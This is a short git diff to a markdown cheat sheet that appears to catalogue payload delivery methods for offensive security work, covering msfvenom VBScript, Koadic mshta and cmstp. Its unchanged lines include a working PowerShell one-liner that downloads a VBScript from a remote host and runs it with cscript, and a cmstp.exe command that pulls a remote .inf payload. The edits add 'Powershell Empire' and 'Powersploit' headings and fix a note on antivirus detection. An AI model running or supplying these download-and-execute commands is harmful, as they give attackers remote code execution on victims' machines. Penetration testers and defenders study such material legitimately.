@@ -59,6 +59,10 @@ Msvenom Vbscript
 powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/ms.vbs', '%temp%\ms.vbs'); Start-Process %windir%\system32\cscript.exe -Filepath '%temp%\ms.vbs'"
 ```
 
+Powershell empire payload 
+
+Powersploit
+
 ## Koadic
 
 Mshta
@@ -98,5 +102,7 @@ Cmstp
 cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
 ```
 
+
+
 # Note
-Msvenom payload may easily detect by AV because of it's popularity used by many attacker and well recognized it pattern.
+Msvenom payload may easily detect by AV because of it's popularity used by many attacker and well recognized by its pattern.
